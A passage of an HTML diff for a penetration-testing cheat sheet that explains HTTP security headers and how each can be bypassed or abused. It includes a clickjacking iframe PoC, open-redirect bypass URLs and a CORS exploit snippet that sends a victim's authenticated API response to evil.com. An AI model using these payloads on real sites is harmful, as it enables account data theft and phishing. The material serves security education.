+          <div class="body-grid">
+            <div class="body-col col-explain">
+              <div class="body-col-title">What It Is</div>
+              <div class="code-block">
+<span class="header-name">Cache-Control:</span> <span class="header-value">no-cache</span>    <span class="comment">← force fresh from origin</span>
+<span class="header-name">Cache-Control:</span> <span class="header-value">no-store</span>    <span class="comment">← don't cache this request</span>
+<span class="header-name">Cache-Control:</span> <span class="header-value">max-age=0</span>   <span class="comment">← treat cached as stale</span>
+<span class="header-name">Pragma:</span> <span class="header-value">no-cache</span>         <span class="comment">← legacy HTTP/1.0 equiv</span>
+              </div>
+            </div>
+            <div class="body-col col-attack">
+              <div class="body-col-title">Pentest Use</div>
+              <ul>
+                <li>Add <code>Cache-Control: no-cache</code> during testing to always get fresh server responses, not cached CDN responses</li>
+                <li>Remove Cache-Control to see if CDN caches a sensitive response you can then retrieve anonymously</li>
+                <li>Use with cache poisoning — control whether your poisoned response gets cached</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div><!-- END REQUEST HEADERS -->
+
+    <!-- ══════════════════════════════════════
+         RESPONSE HEADERS
+    ══════════════════════════════════════ -->
+    <div class="section-divider">
+      <div class="section-divider-line"></div>
+      <div class="section-divider-text">Response Security Headers</div>
+      <div class="section-divider-line"></div>
+    </div>
+
+    <div class="section" id="response-headers">
+      <div class="section-header">
+        <div class="section-icon">←</div>
+        <div class="section-meta">
+          <div class="section-label">Part 2 of 2</div>
+          <div class="section-title">HTTP Response Headers</div>
+          <div class="section-subtitle">Headers sent FROM the server TO the client — your defense layer, their bypass surface</div>
+        </div>
+      </div>
+
+      <div class="info-box">
+        <strong>Pentest Mindset for Response Headers</strong>
+        Missing security headers = vulnerabilities. Present but misconfigured = bypasses. When you see a security header, your job is to find how to get around it. When it's missing, your job is to exploit the absence.
+      </div>
+
+      <!-- CSP -->
+      <div class="header-card hc-critical" id="csp" data-severity="critical">
+        <div class="hc-header" onclick="toggleCard(this.parentElement)">
+          <div class="hc-name">Content-Security-Policy <span class="direction">RES</span></div>
+          <div class="hc-badges">
+            <span class="badge badge-critical">Critical</span>
+            <span class="badge badge-defense">XSS Defense</span>
+            <span class="badge badge-info">CSP Bypass</span>
+          </div>
+          <span class="hc-toggle">+</span>
+        </div>
+        <div class="hc-body">
+          <div class="body-grid">
+            <div class="body-col col-explain">
+              <div class="body-col-title">What It Is</div>
+              <p>The most powerful XSS defense available. Tells the browser what resources it's allowed to load and execute. A properly configured CSP makes XSS nearly impossible to execute — which is why attackers focus heavily on finding CSP bypasses.</p>
+              <div class="code-block">
+<span class="comment"># Strong CSP (nonce-based):</span>
+<span class="header-name">Content-Security-Policy:</span>
+  <span class="header-value">default-src 'none';
+  script-src 'nonce-r4nd0m123' 'strict-dynamic';
+  style-src 'self';
+  img-src 'self' data:;
+  connect-src 'self';
+  base-uri 'none';
+  form-action 'self';
+  frame-ancestors 'none';</span>
+              </div>
+            </div>
+            <div class="body-col col-attack">
+              <div class="body-col-title">CSP Bypass Techniques</div>
+              <ul>
+                <li><strong>unsafe-inline present</strong> — CSP is useless. Inline script tags work. Look for this first.</li>
+                <li><strong>unsafe-eval present</strong> — eval(), Function(), setTimeout(str) all work</li>
+                <li><strong>Whitelisted CDN bypass</strong> — if cdn.jsdelivr.net is allowed, find a JS file there that can be abused (Angular, etc.)</li>
+                <li><strong>JSONP bypass</strong> — if target.com/api?callback=x is in whitelist, inject JSONP callback as XSS payload</li>
+                <li><strong>base-uri missing</strong> — inject &lt;base href="//evil.com"&gt; → all relative URLs hijacked</li>
+                <li><strong>Nonce reuse</strong> — if nonce doesn't change per request, steal it and inject script</li>
+                <li><strong>script-src *</strong> — wildcard allows loading from ANY domain</li>
+                <li><strong>data: URI</strong> — if data: allowed in script-src, direct XSS</li>
+              </ul>
+            </div>
+          </div>
+          <div id="csp-deep" class="body-col-full">
+            <div class="body-col-title" style="color:var(--purple);">CSP Directive Reference — Complete</div>
+            <table class="mini-table">
+              <tr><th>Directive</th><th>Controls</th><th>Attack if misconfigured</th></tr>
+              <tr><td>default-src</td><td>Fallback for all resource types</td><td>Wildcard = loads anything</td></tr>
+              <tr><td>script-src</td><td>JS execution sources</td><td>unsafe-inline, CDN bypass, JSONP</td></tr>
+              <tr><td>style-src</td><td>CSS sources</td><td>unsafe-inline = CSS injection for data steal</td></tr>
+              <tr><td>img-src</td><td>Image sources</td><td>data: = pixel tracking, exfil via img onerror</td></tr>
+              <tr><td>connect-src</td><td>XHR, fetch, WebSocket</td><td>Restricts exfiltration destinations</td></tr>
+              <tr><td>frame-src</td><td>iframe sources</td><td>Missing = clickjacking prep</td></tr>
+              <tr><td>frame-ancestors</td><td>Who can embed this page</td><td>Missing/none → clickjacking possible</td></tr>
+              <tr><td>form-action</td><td>Form submission targets</td><td>Missing = form hijacking via injection</td></tr>
+              <tr><td>base-uri</td><td>Allowed base elements</td><td>Missing = base tag injection</td></tr>
+              <tr><td>object-src</td><td>Plugins (Flash, PDF)</td><td>Missing = plugin-based XSS</td></tr>
+              <tr><td>worker-src</td><td>Web Workers</td><td>Missing = service worker attacks</td></tr>
+              <tr><td>manifest-src</td><td>App manifests</td><td>Missing = manifest injection</td></tr>
+              <tr><td>report-uri</td><td>CSP violation reporting</td><td>Can detect attacker's XSS attempts</td></tr>
+              <tr><td>'nonce-xyz'</td><td>Allow specific inline script</td><td>Predictable nonce → bypass</td></tr>
+              <tr><td>'strict-dynamic'</td><td>Trust script-loaded scripts</td><td>Polyglot exploits</td></tr>
+              <tr><td>'unsafe-inline'</td><td>Allow all inline scripts</td><td>Defeats entire CSP purpose</td></tr>
+              <tr><td>'unsafe-eval'</td><td>Allow eval()</td><td>Eval-based XSS works</td></tr>
+            </table>
+          </div>
+        </div>
+      </div>
+
+      <!-- HSTS -->
+      <div class="header-card hc-critical" id="hsts" data-severity="critical">
+        <div class="hc-header" onclick="toggleCard(this.parentElement)">
+          <div class="hc-name">Strict-Transport-Security (HSTS) <span class="direction">RES</span></div>
+          <div class="hc-badges">
+            <span class="badge badge-critical">Critical</span>
+            <span class="badge badge-defense">SSL Strip Defense</span>
+          </div>
+          <span class="hc-toggle">+</span>
+        </div>
+        <div class="hc-body">
+          <div class="body-grid">
+            <div class="body-col col-explain">
+              <div class="body-col-title">What It Is</div>
+              <p>Tells the browser: "For this domain, ONLY connect via HTTPS for the next <code>max-age</code> seconds. Never try HTTP." This prevents SSL stripping attacks where an attacker on your network downgrades your HTTPS to HTTP.</p>
+              <div class="code-block">
+<span class="comment"># Basic HSTS:</span>
+<span class="header-name">Strict-Transport-Security:</span> <span class="header-value">max-age=31536000</span>
+
+<span class="comment"># With subdomains:</span>
+<span class="header-name">Strict-Transport-Security:</span> <span class="header-value">max-age=31536000; includeSubDomains</span>
+
+<span class="comment"># With preload (submit to browsers' built-in list):</span>
+<span class="header-name">Strict-Transport-Security:</span> <span class="header-value">max-age=63072000; includeSubDomains; preload</span>
+
+<span class="comment"># MISSING = SSL stripping attack possible:</span>
+<span class="bad">HTTP/1.1 200 OK  ← no HSTS = danger</span>
+              </div>
+            </div>
+            <div class="body-col col-attack">
+              <div class="body-col-title">Attack When Missing</div>
+              <div class="attack-scenario">
+                <div class="attack-scenario-title">💀 SSL Stripping (MITM)</div>
+                <p>User types bank.com (HTTP). Without HSTS, attacker on same network intercepts the HTTP request, serves a fake HTTP version while making HTTPS request to real bank. User sees HTTP, attacker sees everything. Tool: <code>sslstrip</code>, bettercap.</p>
+              </div>
+              <ul>
+                <li><strong>First-visit attack</strong> — HSTS only works after first visit. Preload list fixes this.</li>
+                <li><strong>includeSubDomains missing</strong> — subdomain can be HTTP-only, attack vector remains</li>
+                <li><strong>Short max-age</strong> — if max-age=0, HSTS is being removed. Possible downgrade prep.</li>
+                <li><strong>Cookie theft via HTTP</strong> — no HSTS + no Secure cookie flag = cookies over HTTP</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- X-FRAME-OPTIONS -->
+      <div class="header-card hc-high" id="xfo" data-severity="high">
+        <div class="hc-header" onclick="toggleCard(this.parentElement)">
+          <div class="hc-name">X-Frame-Options <span class="direction">RES</span></div>
+          <div class="hc-badges">
+            <span class="badge badge-high">High</span>
+            <span class="badge badge-defense">Clickjacking Defense</span>
+          </div>
+          <span class="hc-toggle">+</span>
+        </div>
+        <div class="hc-body">
+          <div class="body-grid">
+            <div class="body-col col-explain">
+              <div class="body-col-title">What It Is</div>
+              <p>Prevents your page from being embedded in an iframe on another site — blocking clickjacking. Three possible values:</p>
+              <div class="code-block">
+<span class="header-name">X-Frame-Options:</span> <span class="good">DENY</span>         <span class="comment">← never in any frame</span>
+<span class="header-name">X-Frame-Options:</span> <span class="good">SAMEORIGIN</span>  <span class="comment">← only same origin frames</span>
+<span class="header-name">X-Frame-Options:</span> <span class="bad">ALLOW-FROM https://trusted.com</span>
+<span class="comment"># ALLOW-FROM is deprecated and NOT supported in Chrome/Firefox</span>
+<span class="comment"># Use CSP frame-ancestors instead</span>
+
+<span class="comment"># Modern equivalent (preferred):</span>
+<span class="header-name">Content-Security-Policy:</span> <span class="good">frame-ancestors 'none';</span>
+              </div>
+            </div>
+            <div class="body-col col-attack">
+              <div class="body-col-title">When Missing → Clickjacking</div>
+              <div class="attack-scenario">
+                <div class="attack-scenario-title">💀 Clickjacking Attack</div>
+                <p>Embed victim site in transparent iframe over a decoy button. Victim thinks they're clicking "Win prize" but they're actually clicking "Transfer $1000" on the bank site underneath. No X-Frame-Options = this works.</p>
+              </div>
+              <div class="code-block">
+<span class="comment">&lt;!-- Clickjacking PoC --&gt;</span>
+&lt;iframe src="https://victim.com/transfer" style="opacity:0; position:absolute; top:0; left:0; width:100%; height:100%;"&gt;&lt;/iframe&gt;
+&lt;button&gt;Click to win!&lt;/button&gt;
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- X-CONTENT-TYPE-OPTIONS -->
+      <div class="header-card hc-high" id="xcto" data-severity="high">
+        <div class="hc-header" onclick="toggleCard(this.parentElement)">
+          <div class="hc-name">X-Content-Type-Options <span class="direction">RES</span></div>
+          <div class="hc-badges">
+            <span class="badge badge-high">High</span>
+            <span class="badge badge-defense">MIME Sniffing Defense</span>
+          </div>
+          <span class="hc-toggle">+</span>
+        </div>
+        <div class="hc-body">
+          <div class="body-grid">
+            <div class="body-col col-explain">
+              <div class="body-col-title">What It Is</div>
+              <p>Only one valid value: <code>nosniff</code>. Tells the browser: "Do NOT guess the content type — use exactly what I said in Content-Type." Without it, browsers MIME-sniff content, which can turn a text file into executable script.</p>
+              <div class="code-block">
+<span class="header-name">X-Content-Type-Options:</span> <span class="good">nosniff</span>
+
+<span class="comment"># Without nosniff: browser sniffs content
+# Upload "image" that contains HTML/JS
+# Browser serves it with text/plain but sniffs as text/html
+# → XSS execution possible in some scenarios</span>
+              </div>
+            </div>
+            <div class="body-col col-attack">
+              <div class="body-col-title">MIME Confusion Attack</div>
+              <ul>
+                <li>Upload a .jpg that contains <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+                <li>Server sets Content-Type: image/jpeg</li>
+                <li>Without nosniff, browser sniffs content type → sees HTML → executes JS</li>
+                <li>With nosniff, browser respects image/jpeg → displays as broken image</li>
+                <li>Also prevents cross-origin style/script type confusion attacks</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- SET-COOKIE -->
+      <div class="header-card hc-critical" id="set-cookie" data-severity="critical">
+        <div class="hc-header" onclick="toggleCard(this.parentElement)">
+          <div class="hc-name">Set-Cookie <span class="direction">RES</span></div>
+          <div class="hc-badges">
+            <span class="badge badge-critical">Critical</span>
+            <span class="badge badge-info">All Cookie Attributes</span>
+          </div>
+          <span class="hc-toggle">+</span>
+        </div>
+        <div class="hc-body">
+          <div class="body-grid">
+            <div class="body-col col-explain">
+              <div class="body-col-title">Full Cookie Anatomy</div>
+              <div class="code-block">
+<span class="header-name">Set-Cookie:</span> <span class="header-value">session=abc123</span>;
+  <span class="good">Secure</span>;          <span class="comment">← HTTPS only</span>
+  <span class="good">HttpOnly</span>;        <span class="comment">← no JS access</span>
+  <span class="good">SameSite=Strict</span>; <span class="comment">← no cross-site</span>
+  <span class="good">Path=/</span>;
+  <span class="good">Domain=app.com</span>;
+  <span class="good">Max-Age=3600</span>      <span class="comment">← 1 hour expiry</span>
+
+<span class="comment"># WORST CASE (all missing):</span>
+<span class="bad">Set-Cookie: session=abc123</span>
+<span class="comment"># No Secure → sent over HTTP
+# No HttpOnly → XSS steals it
+# No SameSite → CSRF works</span>
+              </div>
+            </div>
+            <div class="body-col col-attack">
+              <div class="body-col-title">Missing Attribute Exploitation</div>
+              <ul>
+                <li><strong>No Secure</strong> → cookie sent over HTTP → network intercept possible</li>
+                <li><strong>No HttpOnly</strong> → <code>document.cookie</code> in XSS steals session</li>
+                <li><strong>SameSite=None</strong> → CSRF attacks work if no separate token</li>
+                <li><strong>SameSite=Lax</strong> → GET-based CSRF still possible (top-level nav)</li>
+                <li><strong>No expiry</strong> → session lasts forever → long theft window</li>
+                <li><strong>Domain=.app.com</strong> → all subdomains get cookie → subdomain XSS steals it</li>
+              </ul>
+            </div>
+          </div>
+          <div id="cookie-attrs" class="body-col-full">
+            <div class="body-col-title" style="color:var(--purple);">Cookie Attribute Deep Reference</div>
+            <div class="attr-row header">
+              <div>Attribute</div>
+              <div>What It Does</div>
+              <div>Missing = Attack</div>
+            </div>
+            <div class="attr-row">
+              <div class="attr-name">Secure</div>
+              <div>Cookie only transmitted over HTTPS (TLS encrypted connections)</div>
+              <div style="color:var(--red);">Cookie sent in plaintext over HTTP → network sniffing steals session</div>
+            </div>
+            <div class="attr-row">
+              <div class="attr-name">HttpOnly</div>
+              <div>JavaScript cannot access the cookie via document.cookie API</div>
+              <div style="color:var(--red);">XSS payload: document.cookie exfiltrates session token</div>
+            </div>
+            <div class="attr-row">
+              <div class="attr-name">SameSite=Strict</div>
+              <div>Cookie NEVER sent on cross-site requests, including top-level navigation</div>
+              <div style="color:var(--amber);">Strongest protection. Can break some OAuth flows.</div>
+            </div>
+            <div class="attr-row">
+              <div class="attr-name">SameSite=Lax</div>
+              <div>Cookie sent on same-site requests AND top-level navigation (GET only)</div>
+              <div style="color:var(--amber);">GET CSRF still works for state-changing GET endpoints</div>
+            </div>
+            <div class="attr-row">
+              <div class="attr-name">SameSite=None</div>
+              <div>Cookie always sent. Requires Secure flag in modern browsers.</div>
+              <div style="color:var(--red);">CSRF attacks fully possible. Required for cross-site iframes.</div>
+            </div>
+            <div class="attr-row">
+              <div class="attr-name">Domain</div>
+              <div>Which domains receive the cookie. Default = only exact domain.</div>
+              <div style="color:var(--amber);">Domain=.site.com → all subdomains get it. subdomain XSS = session theft</div>
+            </div>
+            <div class="attr-row">
+              <div class="attr-name">Path</div>
+              <div>URL path scope. Cookie only sent for matching paths.</div>
+              <div style="color:var(--muted);">Path=/ (root) = too broad but common. Path traversal can sometimes cross paths.</div>
+            </div>
+            <div class="attr-row">
+              <div class="attr-name">Max-Age</div>
+              <div>Cookie lifetime in seconds from now. Overrides Expires if both set.</div>
+              <div style="color:var(--amber);">Very long max-age = stolen cookie valid for years</div>
+            </div>
+            <div class="attr-row">
+              <div class="attr-name">Expires</div>
+              <div>Absolute datetime for cookie expiry. Session cookie = no Expires = deleted on browser close.</div>
+              <div style="color:var(--amber);">No expiry = session persists. Very long = permanent theft window.</div>
+            </div>
+            <div class="attr-row">
+              <div class="attr-name">__Secure- prefix</div>
+              <div>Browser enforces: must have Secure flag, must be HTTPS origin. Extra constraint.</div>
+              <div style="color:var(--green);">If this prefix is present, browser rejects insecure settings automatically</div>
+            </div>
+            <div class="attr-row">
+              <div class="attr-name">__Host- prefix</div>
+              <div>Strictest: Secure required, Domain must not be set, Path must be /. No subdomains.</div>
+              <div style="color:var(--green);">Most secure cookie possible. Prevents subdomain cookie theft.</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- CORS ACAO -->
+      <div class="header-card hc-critical" id="cors-acao" data-severity="critical">
+        <div class="hc-header" onclick="toggleCard(this.parentElement)">
+          <div class="hc-name">Access-Control-Allow-Origin <span class="direction">RES</span></div>
+          <div class="hc-badges">
+            <span class="badge badge-critical">Critical</span>
+            <span class="badge badge-info">CORS Misconfig</span>
+            <span class="badge badge-info">Data Theft</span>
+          </div>
+          <span class="hc-toggle">+</span>
+        </div>
+        <div class="hc-body">
+          <div id="cors-deep">
+          <div class="body-grid">
+            <div class="body-col col-explain">
+              <div class="body-col-title">CORS Full Explanation</div>
+              <p>CORS (Cross-Origin Resource Sharing) is the browser mechanism that controls which origins can read responses from cross-origin requests. The browser enforces this — servers just set the policy via headers.</p>
+              <div class="code-block">
+<span class="comment"># CORS Response Headers:</span>
+<span class="header-name">Access-Control-Allow-Origin:</span> <span class="header-value">https://trusted.com</span>
+<span class="header-name">Access-Control-Allow-Credentials:</span> <span class="header-value">true</span>
+<span class="header-name">Access-Control-Allow-Methods:</span> <span class="header-value">GET, POST, DELETE</span>
+<span class="header-name">Access-Control-Allow-Headers:</span> <span class="header-value">Authorization, Content-Type</span>
+<span class="header-name">Access-Control-Expose-Headers:</span> <span class="header-value">X-Custom-Header</span>
+<span class="header-name">Access-Control-Max-Age:</span> <span class="header-value">86400</span>
+
+<span class="comment"># DANGER: Wildcard + Credentials = CRITICAL BUG</span>
+<span class="bad">Access-Control-Allow-Origin: *</span>
+<span class="bad">Access-Control-Allow-Credentials: true</span>
+<span class="comment"># Browsers actually BLOCK this combo, but…</span>
+<span class="comment"># If server reflects Origin header instead of *:</span>
+<span class="bad">Access-Control-Allow-Origin: https://evil.com</span>
+<span class="bad">Access-Control-Allow-Credentials: true</span>
+<span class="comment"># Now evil.com can read any cross-origin response WITH cookies</span>
+              </div>
+            </div>
+            <div class="body-col col-attack">
+              <div class="body-col-title">CORS Attack Scenarios</div>
+              <div class="attack-scenario">
+                <div class="attack-scenario-title">💀 Origin Reflection Attack</div>
+                <p>Server reflects your Origin header back as ACAO. Send Origin: evil.com → get ACAO: evil.com + ACAC: true → your page can make authenticated requests to target API and read all responses. Full account data theft.</p>
+              </div>
+              <ul>
+                <li><strong>Wildcard subdomain trust</strong> — *.target.com allowed → get XSS on any subdomain</li>
+                <li><strong>Null origin bypass</strong> — sandboxed iframe sends Origin: null, server allows null → CORS bypass</li>
+                <li><strong>Regex bypass</strong> — targetcom.evil.com matches regex "target.com" → allowed</li>
+                <li><strong>http vs https</strong> — if http://target.com allowed, HTTP MITM possible</li>
+              </ul>
+              <div class="code-block">
+<span class="comment">// CORS exploit PoC:</span>
+<span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();
+xhr.open(<span class="header-value">'GET'</span>, <span class="header-value">'https://victim.com/api/profile'</span>);
+xhr.withCredentials = <span class="keyword">true</span>; <span class="comment">// sends cookies</span>
+xhr.onload = <span class="keyword">function</span>() {
+  fetch(<span class="header-value">'https://evil.com/?data='</span> + btoa(xhr.responseText));
+};
+xhr.send();
+              </div>
+            </div>
+          </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- REFERRER POLICY -->
+      <div class="header-card hc-high" id="referrer-policy" data-severity="high">
+        <div class="hc-header" onclick="toggleCard(this.parentElement)">
+          <div class="hc-name">Referrer-Policy <span class="direction">RES</span></div>
+          <div class="hc-badges">
+            <span class="badge badge-high">High</span>
+            <span class="badge badge-defense">Data Leakage Defense</span>
+          </div>
+          <span class="hc-toggle">+</span>
+        </div>
+        <div class="hc-body">
+          <div class="body-grid">
+            <div class="body-col col-explain">
+              <div class="body-col-title">What It Is & All Values</div>
+              <p>Controls how much referrer information is sent in the Referer header. Missing or permissive = sensitive URL data leaks to third parties.</p>
+              <table class="mini-table">
+                <tr><th>Value</th><th>What's Sent</th></tr>
+                <tr><td>no-referrer</td><td>Nothing sent ever</td></tr>
+                <tr><td>no-referrer-when-downgrade</td><td>Full URL, except HTTPS→HTTP (default)</td></tr>
+                <tr><td>same-origin</td><td>Full URL only for same-origin requests</td></tr>
+                <tr><td>origin</td><td>Just scheme+host (no path/query)</td></tr>
+                <tr><td>strict-origin</td><td>origin only, nothing on HTTPS→HTTP</td></tr>
+                <tr><td>origin-when-cross-origin</td><td>Full URL same-origin, just origin cross-origin</td></tr>
+                <tr><td>strict-origin-when-cross-origin</td><td>Best practice — origin only cross-origin</td></tr>
+                <tr><td>unsafe-url</td><td>Full URL always — DANGEROUS</td></tr>
+              </table>
+            </div>
+            <div class="body-col col-attack">
+              <div class="body-col-title">Attack Angle</div>
+              <ul>
+                <li><strong>Token leakage via Referer</strong> — password reset link /reset?token=SECRET → third party analytics on next page sees the full URL with token</li>
+                <li><strong>Path disclosure</strong> — internal path structure revealed to external partners via Referer</li>
+                <li><strong>User enumeration</strong> — /profile/username leaks usernames via Referer</li>
+              </ul>
+              <div class="defense-box">
+                <div class="defense-box-title">Best Practice</div>
+                <p>Use <code>strict-origin-when-cross-origin</code> — only sends scheme+host cross-origin, full URL same-origin.</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- PERMISSIONS POLICY -->
+      <div class="header-card hc-medium" id="permissions-policy" data-severity="medium">
+        <div class="hc-header" onclick="toggleCard(this.parentElement)">
+          <div class="hc-name">Permissions-Policy <span class="direction">RES</span></div>
+          <div class="hc-badges">
+            <span class="badge badge-medium">Medium</span>
+            <span class="badge badge-defense">Browser API Restriction</span>
+          </div>
+          <span class="hc-toggle">+</span>
+        </div>
+        <div class="hc-body">
+          <div class="body-grid">
+            <div class="body-col col-explain">
+              <div class="body-col-title">What It Is</div>
+              <p>Formerly Feature-Policy. Restricts which browser APIs and features this page (and embedded iframes) can use. Critical in sensitive apps.</p>
+              <div class="code-block">
+<span class="header-name">Permissions-Policy:</span>
+  <span class="good">camera=(),</span>         <span class="comment">← block camera entirely</span>
+  <span class="good">microphone=(),</span>      <span class="comment">← block mic entirely</span>
+  <span class="good">geolocation=(),</span>     <span class="comment">← block location</span>
+  <span class="good">payment=(self),</span>     <span class="comment">← payment only self</span>
+  <span class="good">usb=(),</span>
+  <span class="good">accelerometer=()</span>
+              </div>
+            </div>
+            <div class="body-col col-attack">
+              <div class="body-col-title">Pentest Angle</div>
+              <ul>
+                <li><strong>Missing policy</strong> — embedded malicious iframe could use camera/mic APIs on the parent's domain</li>
+                <li><strong>Overly permissive</strong> — payment=* allows any iframe to use Payment Request API</li>
+                <li><strong>XSS amplification</strong> — XSS + no Permissions-Policy = attacker can access device camera via JS</li>
+                <li>Check for this header — its absence on sensitive apps (banking, healthcare) is a finding</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- SERVER / X-POWERED-BY -->
+      <div class="header-card hc-high" id="server" data-severity="high">
+        <div class="hc-header" onclick="toggleCard(this.parentElement)">
+          <div class="hc-name">Server &amp; X-Powered-By <span class="direction">RES</span></div>
+          <div class="hc-badges">
+            <span class="badge badge-high">High</span>
+            <span class="badge badge-info">Version Disclosure</span>
+            <span class="badge badge-info">Fingerprinting</span>
+          </div>
+          <span class="hc-toggle">+</span>
+        </div>
+        <div class="hc-body">
+          <div class="body-grid">
+            <div class="body-col col-explain">
+              <div class="body-col-title">What They Are</div>
+              <p>Tell attackers exactly what software and version is running. This is the starting point for searching known CVEs.</p>
+              <div class="code-block">
+<span class="comment"># Information disclosure:</span>
+<span class="bad">Server: Apache/2.4.49 (Unix)</span>
+<span class="bad">X-Powered-By: PHP/7.2.1</span>
+<span class="bad">X-AspNet-Version: 4.0.30319</span>
+<span class="bad">X-Generator: WordPress 5.8.1</span>
+
+<span class="comment"># Good (suppressed):</span>
+<span class="good">Server: nginx</span>  <span class="comment">← no version</span>
+<span class="comment"># Or completely removed</span>
+              </div>
+            </div>
+            <div class="body-col col-attack">
+              <div class="body-col-title">Exploitation Path</div>
+              <ul>
+                <li><strong>Apache 2.4.49/50</strong> → CVE-2021-41773 path traversal + RCE</li>
+                <li><strong>PHP version disclosure</strong> → look up version-specific vulnerabilities</li>
+                <li><strong>WordPress version</strong> → wpscan --url target.com with version-targeted exploits</li>
+                <li><strong>IIS version</strong> → specific WebDAV, ASP.NET vulnerabilities per version</li>
+                <li>Search: site:exploit-db.com [software] [version]</li>
+                <li>Check: vulners.com, nvd.nist.gov with exact version</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- CACHE-CONTROL RES -->
+      <div class="header-card hc-high" id="cache-control-res" data-severity="high">
+        <div class="hc-header" onclick="toggleCard(this.parentElement)">
+          <div class="hc-name">Cache-Control (Response) <span class="direction">RES</span></div>
+          <div class="hc-badges">
+            <span class="badge badge-high">High</span>
+            <span class="badge badge-info">Sensitive Data Caching</span>
+            <span class="badge badge-info">Cache Poisoning</span>
+          </div>
+          <span class="hc-toggle">+</span>
+        </div>
+        <div class="hc-body">
+          <div class="body-grid">
+            <div class="body-col col-explain">
+              <div class="body-col-title">All Directives</div>
+              <div class="code-block">
+<span class="comment"># Prevent caching sensitive content:</span>
+<span class="good">Cache-Control: no-store, no-cache, must-revalidate</span>
+
+<span class="comment"># Common directives:</span>
+<span class="header-name">no-store</span>    <span class="comment">← NEVER store this response anywhere</span>
+<span class="header-name">no-cache</span>    <span class="comment">← store but revalidate before use</span>
+<span class="header-name">private</span>     <span class="comment">← only browser cache, not CDN/proxies</span>
+<span class="header-name">public</span>      <span class="comment">← CDN can cache this</span>
+<span class="header-name">max-age=3600</span> <span class="comment">← fresh for 1 hour</span>
+<span class="header-name">s-maxage=60</span> <span class="comment">← CDN cache for 60s only</span>
+<span class="header-name">must-revalidate</span> <span class="comment">← revalidate when stale</span>
+<span class="header-name">immutable</span>   <span class="comment">← never revalidate (static assets)</span>
+              </div>
+            </div>
+            <div class="body-col col-attack">
+              <div class="body-col-title">Attack Vectors</div>
+              <ul>
+                <li><strong>Sensitive response cached</strong> — banking page, profile data with Cache-Control: public or max-age → next user on shared browser/CDN sees previous user's data</li>
+                <li><strong>Cache poisoning</strong> — inject malicious response into CDN cache via unkeyed headers → served to all users</li>
+                <li><strong>Shared cache disclosure</strong> — CDN cached a POST response (misconfiguration) → replay GET to retrieve cached sensitive response</li>
+              </ul>
+              <div class="attack-scenario">
+                <div class="attack-scenario-title">💀 Caching Sensitive Page</div>
+                <p>Bank's account page lacks Cache-Control: no-store. CDN caches the authenticated response. Next visitor to the same URL (before cache expires) gets the previous user's account data — without being logged in.</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- LOCATION -->
+      <div class="header-card hc-high" id="location" data-severity="high">
+        <div class="hc-header" onclick="toggleCard(this.parentElement)">
+          <div class="hc-name">Location <span class="direction">RES</span></div>
+          <div class="hc-badges">
+            <span class="badge badge-high">High</span>
+            <span class="badge badge-info">Open Redirect</span>
+            <span class="badge badge-info">Token Leakage</span>
+          </div>
+          <span class="hc-toggle">+</span>
+        </div>
+        <div class="hc-body">
+          <div class="body-grid">
+            <div class="body-col col-explain">
+              <div class="body-col-title">What It Is</div>
+              <p>Used in redirect responses (301, 302, 307, 308) to specify where the client should go next. If the redirect destination can be controlled by user input — that's an Open Redirect vulnerability.</p>
+              <div class="code-block">
+<span class="comment"># Server sends:</span>
+HTTP/1.1 <span class="header-value">302 Found</span>
+<span class="header-name">Location:</span> <span class="header-value">https://app.com/dashboard</span>
+
+<span class="comment"># Vulnerable code (PHP):</span>
+header("Location: " . $_GET['next']);
+<span class="comment"># Attacker URL: /login?next=https://evil.com</span>
+<span class="comment"># Victim gets redirected to evil.com after login</span>
+              </div>
+            </div>
+            <div class="body-col col-attack">
+              <div class="body-col-title">Attack Chains</div>
+              <ul>
+                <li><strong>Phishing via open redirect</strong> — trusted domain redirects to phishing site. Victim trusts the URL.</li>
+                <li><strong>OAuth token theft</strong> — open redirect in OAuth redirect_uri → authorization code sent to attacker</li>
+                <li><strong>SSRF via redirect</strong> — SSRF filters allow target.com. target.com redirects to 169.254.169.254. Server follows redirect.</li>
+                <li><strong>Token in Location</strong> — if sensitive tokens appear in redirect URLs, they leak via Referer</li>
+              </ul>
+              <div class="code-block">
+<span class="comment"># Open redirect filter bypass:</span>
+<span class="attack">https://target.com/redirect?to=//evil.com</span>
+<span class="attack">https://target.com/redirect?to=https:evil.com</span>
+<span class="attack">https://target.com/redirect?to=https://target.com@evil.com</span>
+<span class="attack">https://target.com/redirect?to=\/\/evil.com</span>
+<span class="attack">https://target.com/redirect?to=%2F%2Fevil.com</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- COOP / COEP / CORP -->
+      <div class="header-card hc-medium" id="coop" data-severity="medium">
+        <div class="hc-header" onclick="toggleCard(this.parentElement)">
+          <div class="hc-name">COOP / COEP / CORP <span class="direction">RES</span></div>
+          <div class="hc-badges">
+            <span class="badge badge-medium">Medium</span>
+            <span class="badge badge-defense">Spectre Defense</span>
+          </div>
+          <span class="hc-toggle">+</span>
+        </div>
+        <div class="hc-body">
+          <div class="body-grid">
+            <div class="body-col col-explain">
+              <div class="body-col-title">What They Are</div>
+              <p>Three headers that together enable cross-origin isolation — required to use SharedArrayBuffer and high-res timers safely (after Spectre/Meltdown). Also restrict how pages can interact cross-origin.</p>
+              <div class="code-block">
+<span class="comment"># Cross-Origin-Opener-Policy:</span>
+<span class="header-name">COOP:</span> <span class="header-value">same-origin</span>
+<span class="comment"># Isolates browsing context group from cross-origin pages
+# Prevents window.opener attacks</span>
+
+<span class="comment"># Cross-Origin-Embedder-Policy:</span>
+<span class="header-name">COEP:</span> <span class="header-value">require-corp</span>
+<span class="comment"># Requires all subresources to have CORP header</span>
+
+<span class="comment"># Cross-Origin-Resource-Policy:</span>
